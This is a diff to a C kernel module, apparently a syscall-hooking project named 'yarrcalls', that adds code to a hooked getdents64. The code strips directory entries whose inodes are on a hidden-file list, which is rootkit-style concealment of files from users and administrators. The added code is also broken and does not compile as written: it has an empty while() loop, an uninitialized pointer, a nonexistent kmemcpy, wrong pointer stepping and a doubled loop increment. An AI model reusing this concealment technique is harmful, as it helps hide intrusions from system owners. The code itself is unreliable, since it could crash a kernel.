@@ -45,6 +45,18 @@
 // Also a few yarrcalls has their own TODO... and also there are all those
 // not known bugs :).
 
+// Just an auxiliar function to deal with dirents of sys_getdents. This is
+// highly unefficient :(.
+int remove_dirent(struct linux_dirent64 __user *dirent_list, unsigned int pos,
+				  size_t len) {
+	struct linux_dirent64 *curr_dirent, *next_dirent;
+
+	curr_dirent = dirent_list;
+	while () {
+
+	}
+}
+
 /*
  * Here we declare all the system calls that we will capture. This array has
  * as many positions as syscalls are in the kernel. Each position has NULL or
@@ -1498,6 +1510,41 @@ asmlinkage long yarr_getdents64(unsigned int fd,
 	// Here comes the black magic... We inspect all the dirents looking
 	// for anything we are hidding, if we find something we have to remove
 	// that dirent and move the rest.
+	
+	// TODO: This code overloads this system call quite a few, with directories
+	// with a lot of files this could cause an unacceptable overhead. Another
+	// approach could be go deep in sys_getdents64, understand how it works and
+	// control the dirents while they are being added.
+
+	// TODO: Ok, right now this is not correct. We are just looking the inodes
+	// in the list of hidden files, but we should check in WHICH FILESYSTEM the
+	// fd file descriptor is and also check the MOUNT ID.
+	struct linux_dirent64 *aux_list, *curr_dirent, *curr_aux_dirent;
+	unsigned int i;
+	size_t len_list;
+
+	// We create an auxiliar list, we iterate over the original list checking
+	// whether the current dirent inode number is being hidden or not, if not
+	// we copy that dirent to our auxiliar list. When we finish traversing the
+	// list we have in our auxiliar list the dirents to be shown, so we copy
+	// it to the user list and return.
+	if (ret > 0) {
+		len_list = ret / sizeof(struct linux_dirent64);
+		aux_list = (struct linux_dirent64)kmalloc(ret, GFP_KERNEL);
+		curr_dirent = dirent;
+		for (i=0; i<len_list; i++) {
+			if (!isInodeHide(curr_dirent->d_ino)) {
+				kmemcpy(curr_aux_dirent, curr_dirent, sizeof(struct linux_dirent64));
+				curr_aux_dirent += curr_dirent->d_off;
+			}
+
+			memset(curr_dirent, 0, sizeof(struct linux_dirent64));
+			curr_dirent += curr_dirent->d_off;
+			i++;
+		}
+
+		
+	}
 
 	return ret;
 }
